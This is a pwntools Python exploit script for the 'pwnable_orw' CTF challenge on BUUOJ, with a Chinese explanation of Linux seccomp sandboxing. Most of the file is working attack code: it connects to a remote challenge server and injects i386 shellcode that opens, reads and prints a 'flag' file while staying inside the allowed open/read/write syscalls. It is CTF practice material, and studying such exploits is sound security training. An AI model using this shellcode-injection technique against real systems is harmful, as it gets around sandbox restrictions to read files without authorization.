from pwn import *

'''
知识点引入：
    seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sand-boxing 机制。
    在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，
    而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，
    该模式下的进程只能调用4种系统调用（system call），
    即 
        read()
        write()
        exit()
        sigreturn()
    否则进程便会被终止。
    
    借助seccomp-tools工具查看可以系统调用的函数：
        seccomp-tools dump ./pwnable_orw
    还能调用o(open)/r(read)/w(write)功能，题目orw的提示就是这样来的！
'''


def pwnable_orw(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/pwnable_orw'):
    print('pwnable_orw start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 25529)

    # gdb.attach(target)
    shellcode = shellcraft.open('flag')
    shellcode += shellcraft.read('eax', 'esp', 60)  # 写入到esp的地址，其他可写地址也行，60大小随便改。eax处不为(0/1/2已被占用的文件描述符即可)
    shellcode += shellcraft.write(1, 'esp', 60)  # 从esp读取内容
    payload = asm(shellcode)

    target.sendlineafter('Give my your shellcode:', payload)
    print(target.recvline())
    print(target.recv())
    print('pwnable_orw end')


if __name__ == '__main__':
    pwnable_orw()
